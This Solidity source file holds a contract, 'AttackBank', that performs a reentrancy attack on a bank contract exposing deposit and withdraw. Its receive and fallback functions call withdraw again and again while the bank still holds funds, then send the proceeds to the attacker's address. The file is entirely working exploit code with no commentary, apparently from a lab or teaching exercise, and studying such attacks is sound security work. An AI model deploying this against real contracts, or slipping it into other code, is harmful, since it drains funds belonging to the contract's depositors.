// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface Bank_V1 {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackBank {
    Bank_V1 public immutable bankv1;
    address public owner;

    constructor(address bankAddress) {
        owner = msg.sender;
        bankv1 = Bank_V1(bankAddress);
    }

    function attack() external payable {
        bankv1.deposit{value: 1 ether}();
        bankv1.withdraw();
    }

    receive() external payable {
        if (address(bankv1).balance > 1 ether) {
            bankv1.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    fallback() external payable {
        if (address(bankv1).balance > 1 ether) {
            bankv1.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
